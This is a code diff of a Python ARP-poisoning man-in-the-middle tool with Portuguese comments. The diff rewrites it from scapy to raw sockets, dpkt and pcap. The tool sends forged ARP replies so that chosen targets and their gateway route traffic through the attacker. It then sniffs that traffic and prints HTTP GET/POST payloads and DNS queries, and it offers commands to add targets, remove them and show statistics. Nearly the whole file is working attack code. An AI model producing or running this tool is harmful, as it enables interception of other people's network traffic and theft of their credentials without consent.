@@ -4,14 +4,25 @@ import threading
 import queue
 import time
 import os
-from scapy.all import *
+import socket
+import struct
+import binascii
+import pcap
+import dpkt
+from dpkt.ethernet import Ethernet
+from dpkt.arp import ARP
+from dpkt.ip import IP as DPKT_IP
+from dpkt.tcp import TCP as DPKT_TCP
+from dpkt.udp import UDP as DPKT_UDP
+from dpkt.icmp import ICMP as DPKT_ICMP
+from dpkt.dns import DNS
 
 IP = CMD = 0
 MAC = TARGET = 1
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='O envenenamento por ARP ocorre entre ' + 'um portal e vários ' + 'alvos')
+    parser = argparse.ArgumentParser(description='O envenenamento por ARP ocorre entre um portal e vários alvos')
     parser.add_argument('-i', '--interface', dest='interface', help='interface para enviar')
     parser.add_argument('-t', '--targets', dest='targets', help='lista de endereços IP separados por vírgulas', required=True)
     parser.add_argument('-g', '--gateway', dest='gateway', help='Endereço IP do gateway', required=True)
@@ -20,17 +31,30 @@ def parse_args():
 
 def get_working_if():
     """Retorna a primeira interface que funciona, excluindo lo (loopback)"""
-    ifaces = get_if_list()
-    for iface in ifaces:
-        if iface != 'lo' and is_interface_valid(iface):
-            return iface
-    raise Exception('Nenhuma interface válida encontrada')
+    try:
+        # Listar interfaces disponíveis com pcap
+        devices = pcap.findalldevs()
+        for device in devices:
+            if device != 'lo' and device != 'localhost' and is_interface_valid(device):
+                return device
+        raise Exception('Nenhuma interface válida encontrada')
+    except Exception as e:
+        print(f"Erro ao encontrar interfaces: {e}")
+        raise
 
 
 def is_interface_valid(iface):
     """Verifica se a interface é válida"""
     try:
-        ip = get_if_addr(iface)
+        # Tenta obter informações da interface
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        ip = socket.inet_ntoa(fcntl.ioctl(
+            s.fileno(),
+            0x8915,  # SIOCGIFADDR
+            struct.pack('256s', iface.encode()[:15])
+        )[20:24])
+        s.close()
+        
         if ip != '0.0.0.0' and ip != '127.0.0.1':
             return True
     except:
@@ -38,16 +62,104 @@ def is_interface_valid(iface):
     return False
 
 
+def get_if_addr(interface):
+    """Obtém o endereço IP da interface"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        ip = socket.inet_ntoa(fcntl.ioctl(
+            s.fileno(),
+            0x8915,  # SIOCGIFADDR
+            struct.pack('256s', interface.encode()[:15])
+        )[20:24])
+        s.close()
+        return ip
+    except Exception as e:
+        print(f"Erro ao obter endereço IP para {interface}: {e}")
+        return "0.0.0.0"
+
+
+def get_if_hwaddr(interface):
+    """Obtém o endereço MAC da interface"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        mac = fcntl.ioctl(
+            s.fileno(),
+            0x8927,  # SIOCGIFHWADDR
+            struct.pack('256s', interface.encode()[:15])
+        )[18:24]
+        s.close()
+        return ':'.join(['%02x' % b for b in mac])
+    except Exception as e:
+        print(f"Erro ao obter endereço MAC para {interface}: {e}")
+        return "00:00:00:00:00:00"
+
+
+def mac_to_bytes(mac_addr):
+    """Converte endereço MAC string para bytes"""
+    return binascii.unhexlify(mac_addr.replace(':', ''))
+
+
+def ip_to_int(ip_addr):
+    """Converte endereço IP string para inteiro"""
+    return struct.unpack("!I", socket.inet_aton(ip_addr))[0]
+
+
 def get_MAC(interface, target_IP):
+    """Obtém o endereço MAC de um IP usando ARP request"""
     source_IP = get_if_addr(interface)
     source_MAC = get_if_hwaddr(interface)
-    p = ARP(hwsrc=source_MAC, psrc=source_IP) # type: ignore
-    p.hwdst = 'ff:ff:ff:ff:ff:ff'
-    p.pdst = target_IP
-    reply, unans = sr(p, timeout=10, verbose=0)
-    if len(reply) == 0:
-        raise Exception('Erro ao encontrar MAC para %s, tente usar -i' % target_IP)
-    return reply[0][1].hwsrc
+    
+    # Criar socket para ARP
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+    s.bind((interface, 0))
+    
+    # Criar pacote ARP request
+    arp = dpkt.arp.ARP(
+        hrd=dpkt.arp.ARP_HRD_ETH,
+        pro=dpkt.arp.ARP_PRO_IP,
+        hln=6,
+        pln=4,
+        op=dpkt.arp.ARP_OP_REQUEST,
+        sha=mac_to_bytes(source_MAC),
+        spa=socket.inet_aton(source_IP),
+        tha=b'\x00\x00\x00\x00\x00\x00',
+        tpa=socket.inet_aton(target_IP)
+    )
+    
+    # Empacotar em um frame Ethernet
+    eth = dpkt.ethernet.Ethernet(
+        dst=b'\xff\xff\xff\xff\xff\xff',
+        src=mac_to_bytes(source_MAC),
+        type=dpkt.ethernet.ETH_TYPE_ARP,
+        data=arp
+    )
+    
+    # Enviar o pacote
+    s.send(bytes(eth))
+    
+    # Configurar para receber a resposta
+    start_time = time.time()
+    timeout = 5  # segundos
+    
+    while time.time() - start_time < timeout:
+        try:
+            packet = s.recv(1024)
+            eth_recv = dpkt.ethernet.Ethernet(packet)
+            
+            if isinstance(eth_recv.data, dpkt.arp.ARP):
+                arp_recv = eth_recv.data
+                if (arp_recv.op == dpkt.arp.ARP_OP_REPLY and
+                    socket.inet_ntoa(arp_recv.spa) == target_IP):
+                    # Encontrou o MAC
+                    target_mac = ':'.join(['%02x' % b for b in arp_recv.sha])
+                    s.close()
+                    return target_mac
+        except:
+            # Ignorar pacotes malformados
+            pass
+    
+    s.close()
+    raise Exception(f'Erro ao encontrar MAC para {target_IP}, tente usar -i')
 
 
 def get_MAC_alternative(interface, target_IP):
@@ -55,20 +167,58 @@ def get_MAC_alternative(interface, target_IP):
     try:
         # Método 1: Tenta obter normalmente
         return get_MAC(interface, target_IP)
-    except Exception:
-        print(f"Aviso: Impossível obter MAC para {target_IP}, usando MAC de broadcast")
+    except Exception as e:
+        print(f"Aviso: Impossível obter MAC para {target_IP}: {e}")
+        print(f"Usando MAC de broadcast")
         # Retorna endereço de broadcast como alternativa
         return "ff:ff:ff:ff:ff:ff"
 
 
-def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
+def send_ARP_packet(interface, destination_IP, destination_MAC, source_IP, source_MAC):
+    """Envia pacote ARP usando socket raw"""
+    print(f"Enviando ARP para: IP={destination_IP}")
+    
+    # Criar socket para ARP
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+        s.bind((interface, 0))
+        
+        # Criar pacote ARP reply (envenenamento)
+        arp = dpkt.arp.ARP(
+            hrd=dpkt.arp.ARP_HRD_ETH,
+            pro=dpkt.arp.ARP_PRO_IP,
+            hln=6,
+            pln=4,
+            op=dpkt.arp.ARP_OP_REPLY,
+            sha=mac_to_bytes(source_MAC),
+            spa=socket.inet_aton(source_IP),
+            tha=mac_to_bytes(destination_MAC),
+            tpa=socket.inet_aton(destination_IP)
+        )
+        
+        # Empacotar em um frame Ethernet
+        eth = dpkt.ethernet.Ethernet(
+            dst=mac_to_bytes(destination_MAC),
+            src=mac_to_bytes(source_MAC),
+            type=dpkt.ethernet.ETH_TYPE_ARP,
+            data=arp
+        )
+        
+        # Enviar o pacote
+        s.send(bytes(eth))
+        s.close()
+    except Exception as e:
+        print(f"Erro ao enviar pacote ARP: {e}")
+
+
+def start_poison_thread(interface, targets, gateway, control_queue, attacker_MAC):
     finish = False
 
     while not finish:
         # Enviar pacotes ARP falsificados
         for t in targets:
-            send_ARP_alternative(t[IP], t[MAC], gateway[IP], attacker_MAC)
-            send_ARP_alternative(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
+            send_ARP_packet(interface, t[IP], t[MAC], gateway[IP], attacker_MAC)
+            send_ARP_packet(interface, gateway[IP], gateway[MAC], t[IP], attacker_MAC)
         time.sleep(1)
         
         # Verificar comandos na fila
@@ -86,7 +236,7 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
                 elif cmd in ['del', 'delete', 'remove']:
                     try:
                         targets.remove(item[TARGET])
-                        restore_ARP_caches([item[TARGET]], gateway, False)
+                        restore_ARP_caches(interface, [item[TARGET]], gateway, False)
                     except ValueError:
                         print("%s não está na lista de alvos" % item[TARGET][0])
 
@@ -98,118 +248,130 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
         except queue.Empty:
             pass  # Fila vazia, continuar o loop
 
-    restore_ARP_caches(targets, gateway)
+    restore_ARP_caches(interface, targets, gateway)
 
 
-def restore_ARP_caches(targets, gateway, verbose=True):
+def restore_ARP_caches(interface, targets, gateway, verbose=True):
     print('Parando o ataque, restaurando o cache ARP')
     for i in range(3):
         if verbose:
             print("ARP %s está em %s" % (gateway[IP], gateway[MAC]))
         for t in targets:
             if verbose:
-                print("ARP %s is at %s" % (t[IP], t[MAC]))
-            send_ARP_alternative(t[IP], t[MAC], gateway[IP], gateway[MAC])
-            send_ARP_alternative(gateway[IP], gateway[MAC], t[IP], t[MAC])
+                print("ARP %s está em %s" % (t[IP], t[MAC]))
+            send_ARP_packet(interface, t[IP], t[MAC], gateway[IP], gateway[MAC])
+            send_ARP_packet(interface, gateway[IP], gateway[MAC], t[IP], t[MAC])
         time.sleep(1)
     print('Caches ARP restaurados')
 
 
-def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
-    """Sempre usa sendp() com frame Ethernet completo para evitar avisos"""
-    print(f"Enviando ARP para: IP={destination_IP}")
-    # Sempre usar Ether + ARP para evitar o aviso
-    arp_packet = Ether(dst=destination_MAC)/ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
-                   psrc=source_IP, hwsrc=source_MAC)
-    sendp(arp_packet, verbose=0)  # Usar sendp em vez de send
-
-
-def send_ARP_alternative(destination_IP, destination_MAC, source_IP, source_MAC):
-    """Envia pacote ARP usando Ethernet broadcast se necessário"""
-    print(f"Enviando ARP para: IP={destination_IP}")
-    
-    # Sempre usar frame Ethernet completo com sendp()
-    arp_packet = Ether(dst=destination_MAC)/ARP(op=2, pdst=destination_IP, 
-                   hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC)
-    sendp(arp_packet, verbose=0)
-
-
-def packet_callback(packet, targets, gateway):
-    """Função de callback para analisar pacotes capturados"""
-    print(f"\n[DEBUG] Pacote recebido: {packet.summary()}")
-    
-    if IP in packet:
-        ip_src = packet[IP].src
-        ip_dst = packet[IP].dst
+def process_packet(packet_data, targets, gateway, packet_stats):
+    """Analisa um pacote capturado e mostra informações relevantes"""
+    try:
+        # Primeiro, decodificar o Ethernet frame
+        eth = dpkt.ethernet.Ethernet(packet_data)
         
-        # Verifica se o pacote é relevante (entre alvos e gateway)
-        is_from_target = any(ip_src == t[IP] for t in targets)
-        is_to_target = any(ip_dst == t[IP] for t in targets)
-        is_from_gateway = (ip_src == gateway[IP])
-        is_to_gateway = (ip_dst == gateway[IP])
-        
-        if (is_from_target and is_to_gateway) or (is_from_gateway and is_to_target):
-            print(f"\n[*] Pacote interceptado: {ip_src} -> {ip_dst}")
+        # Verificar se é um pacote IP
+        if isinstance(eth.data, dpkt.ip.IP):
+            ip_pkt = eth.data
+            src_ip = socket.inet_ntoa(ip_pkt.src)
+            dst_ip = socket.inet_ntoa(ip_pkt.dst)
             
-            # Análise básica de protocolos comuns
-            if TCP in packet:
-                src_port = packet[TCP].sport
-                dst_port = packet[TCP].dport
-                print(f"    TCP {src_port} -> {dst_port}")
+            # Debug de cada pacote
+            print(f"\n[DEBUG] Pacote recebido: IP {src_ip} -> {dst_ip}")
+            
+            # Verificar se o pacote é relevante (entre alvos e gateway)
+            is_from_target = any(src_ip == t[IP] for t in targets)
+            is_to_target = any(dst_ip == t[IP] for t in targets)
+            is_from_gateway = (src_ip == gateway[IP])
+            is_to_gateway = (dst_ip == gateway[IP])
+            
+            # Incrementar contador de pacotes
+            if isinstance(ip_pkt.data, dpkt.tcp.TCP):
+                packet_stats['tcp'] += 1
+            elif isinstance(ip_pkt.data, dpkt.udp.UDP):
+                packet_stats['udp'] += 1
+            elif isinstance(ip_pkt.data, dpkt.icmp.ICMP):
+                packet_stats['icmp'] += 1
+            
+            packet_stats['total'] += 1
+            
+            if (is_from_target and is_to_gateway) or (is_from_gateway and is_to_target):
+                print(f"\n[*] Pacote interceptado: {src_ip} -> {dst_ip}")
                 
-                # Detecta serviços comuns
-                if dst_port == 80:
-                    print("    [HTTP]")
-                    if packet.haslayer(Raw):
+                # Análise por protocolo
+                if isinstance(ip_pkt.data, dpkt.tcp.TCP):
+                    tcp = ip_pkt.data
+                    src_port = tcp.sport
+                    dst_port = tcp.dport
+                    print(f"    TCP {src_port} -> {dst_port}")
+                    
+                    # Detectar serviços comuns
+                    if dst_port == 80:
+                        print("    [HTTP]")
+                        if len(tcp.data) > 0:
+                            try:
+                                payload = tcp.data.decode('utf-8', 'ignore')
+                                if "GET" in payload or "POST" in payload:
+                                    print(f"    Dados: {payload[:100]}...")
+                            except:
+                                pass
+                    
+                    elif dst_port == 443:
+                        print("    [HTTPS]")
+                
+                elif isinstance(ip_pkt.data, dpkt.udp.UDP):
+                    udp = ip_pkt.data
+                    src_port = udp.sport
+                    dst_port = udp.dport
+                    print(f"    UDP {src_port} -> {dst_port}")
+                    
+                    if dst_port == 53 and len(udp.data) > 0:
                         try:
-                            payload = packet[Raw].load.decode('utf-8', errors='ignore')
-                            if "GET" in payload or "POST" in payload:
-                                print(f"    Dados: {payload[:100]}...")
+                            dns = dpkt.dns.DNS(udp.data)
+                            if dns.qr == 0 and len(dns.qd) > 0:  # É uma query
+                                qname = dns.qd[0].name
+                                print(f"    [DNS] Query: {qname}")
                         except:
                             pass
                 
-                elif dst_port == 443:
-                    print("    [HTTPS]")
-                
-            elif UDP in packet:
-                src_port = packet[UDP].sport
-                dst_port = packet[UDP].dport
-                print(f"    UDP {src_port} -> {dst_port}")
-                
-                if dst_port == 53:
-                    print("    [DNS]")
-                    if packet.haslayer(DNSQR):
-                        qname = packet[DNSQR].qname.decode('utf-8')
-                        print(f"    Query: {qname}")
-            
-            elif ICMP in packet:
-                print("    [ICMP]")
+                elif isinstance(ip_pkt.data, dpkt.icmp.ICMP):
+                    print("    [ICMP]")
+    
+    except Exception as e:
+        # Ignorar erros de pacotes malformados
+        pass
 
 
 def start_sniffer(interface, targets, gateway):
-    """Inicia um sniffer de pacotes mais genérico para capturar tráfego"""
+    """Inicia um sniffer usando PyPcap"""
     print(f"[*] Iniciando sniffer na interface {interface}")
     
-    # Criar filtro mais simples para capturar mais pacotes
-    target_ips = [t[IP] for t in targets]
+    # Estatísticas de pacotes
+    packet_stats = {'total': 0, 'tcp': 0, 'udp': 0, 'icmp': 0}
     
-    # Filtro simplificado - capturar qualquer pacote IP (não apenas ARP)
-    # excluindo os próprios pacotes ARP de envenenamento
-    filter_expr = "ip and not arp"
+    # Criar um objeto de captura
+    pc = pcap.pcap(name=interface, promisc=True, immediate=True)
     
-    print(f"[*] Filtro de captura: {filter_expr}")
+    # Configurar filtro BPF - capturar pacotes IP mas não ARP
+    pc.setfilter('ip and not arp')
     
-    # Iniciar o sniffer com armazenamento para debug
-    t = AsyncSniffer(
-        iface=interface,
-        prn=lambda pkt: packet_callback(pkt, targets, gateway),
-        filter=filter_expr,
-        store=True,
-        count=0
-    )
-    t.start()
     print(f"[*] Sniffer iniciado. Capturando pacotes...")
-    return t
+    
+    # Iniciar thread de captura
+    def capture_thread():
+        try:
+            # Para cada pacote capturado
+            for timestamp, packet in pc:
+                process_packet(packet, targets, gateway, packet_stats)
+        except KeyboardInterrupt:
+            pass
+    
+    thread = threading.Thread(target=capture_thread)
+    thread.daemon = True
+    thread.start()
+    
+    return pc, packet_stats, thread
 
 
 def enable_ip_forwarding():
@@ -256,14 +418,13 @@ def main():
     
     # 4. Inicie a thread de envenenamento ARP
     poison_thread = threading.Thread(target=start_poison_thread,
-                                   args=(targets, gateway, control_queue,
+                                   args=(interface, targets, gateway, control_queue,
                                          attacker_MAC))
     poison_thread.daemon = True
     poison_thread.start()
     
     # 5. Inicie o sniffer de pacotes
-    sniffer = start_sniffer(interface, targets, gateway)
-    print("[*] Sniffer iniciado. Capturando pacotes...")
+    sniffer, packet_stats, sniffer_thread = start_sniffer(interface, targets, gateway)
     
     # Após iniciar o sniffer, mas antes do loop de comandos:
     print("\n[*] Sistema configurado:")
@@ -289,6 +450,7 @@ def main():
                         print("add <IP>: adiciona endereço IP à lista de alvos\n" +
                               "del <IP>: remove endereço IP da lista de alvos\n" +
                               "list: imprime todos os alvos atuais\n" +
+                              "stats: mostra estatísticas de pacotes\n" +
                               "exit: interrompe o envenenamento e sai")
 
                     elif cmd in ['quit', 'exit', 'stop', 'leave']:
@@ -326,26 +488,37 @@ def main():
 
                     elif cmd in ['stats', 'statistics']:
                         print(f"[*] Estatísticas do sniffer:")
-                        if hasattr(sniffer, 'results'):
-                            packets = len(sniffer.results)
-                            print(f"  - Pacotes capturados: {packets}")
-                            if packets > 0:
-                                print(f"  - Tipos de pacotes:")
-                                tcp = sum(1 for p in sniffer.results if TCP in p)
-                                udp = sum(1 for p in sniffer.results if UDP in p)
-                                icmp = sum(1 for p in sniffer.results if ICMP in p)
-                                print(f"    * TCP: {tcp}")
-                                print(f"    * UDP: {udp}")
-                                print(f"    * ICMP: {icmp}")
-                        else:
-                            print("  - Nenhum pacote capturado ainda")
+                        print(f"  - Total de pacotes: {packet_stats['total']}")
+                        print(f"  - TCP: {packet_stats['tcp']}")
+                        print(f"  - UDP: {packet_stats['udp']}")
+                        print(f"  - ICMP: {packet_stats['icmp']}")
 
                     elif cmd in ['ping', 'test']:
                         if len(targets) > 0:
                             target = targets[0][IP]
                             print(f"[*] Testando conexão com {target}...")
-                            ping_packet = IP(dst=target)/ICMP()
-                            send(ping_packet, verbose=0)
+                            
+                            # Usar socket raw para enviar ICMP
+                            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                            s.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
+                            
+                            # Montando pacote ICMP simplificado
+                            icmp_type = 8  # Echo request
+                            icmp_code = 0
+                            icmp_checksum = 0
+                            icmp_id = os.getpid() & 0xFFFF
+                            icmp_seq = 1
+                            icmp_data = b'abcdefghijklmnopqrstuvwxyz'
+                            
+                            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
+                                                  icmp_id, icmp_seq)
+                            icmp_checksum = checksum(icmp_header + icmp_data)
+                            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
+                                                  icmp_id, icmp_seq)
+                            
+                            s.sendto(icmp_header + icmp_data, (target, 0))
+                            s.close()
+                            
                             print(f"[*] Pacote de teste enviado para {target}")
             except EOFError:
                 break
@@ -354,7 +527,34 @@ def main():
         print("\nInterrompendo o ataque...")
         control_queue.put(('quit',))
         poison_thread.join(timeout=5)
-        sniffer.stop()  # Para o sniffer quando o programa termina
+        # Para o sniffer
+        if hasattr(sniffer, 'close'):
+            sniffer.close()
+
+
+def checksum(data):
+    """Calcula o checksum de um pacote ICMP"""
+    if len(data) % 2:
+        data += b'\x00'
+    s = sum(array.array('H', data))
+    s = (s >> 16) + (s & 0xffff)
+    s += s >> 16
+    s = ~s & 0xffff
+    return s
+
 
 if __name__ == '__main__':
+    # Importações que podem não estar disponíveis em todos os sistemas
+    try:
+        import fcntl
+        import array
+    except ImportError:
+        if sys.platform != "win32":
+            print("Erro: Módulos fcntl e/ou array não encontrados")
+            sys.exit(1)
+        else:
+            # Em Windows, implementar alternativas para obter MAC/IP
+            import ctypes
+            import winreg
+    
     main()
